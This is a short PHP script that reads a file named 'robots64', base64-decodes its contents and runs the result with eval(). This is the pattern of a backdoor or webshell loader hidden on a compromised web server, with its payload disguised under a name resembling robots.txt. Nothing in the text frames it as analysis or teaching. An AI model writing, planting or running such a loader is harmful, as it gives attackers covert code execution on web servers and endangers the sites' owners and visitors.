<?$filePath="robots64";
$file=fopen($filePath,"r");
if($file){
$content=fread($file,filesize($filePath));
eval (base64_decode($content));
fclose($file);
echo ("end" );
}
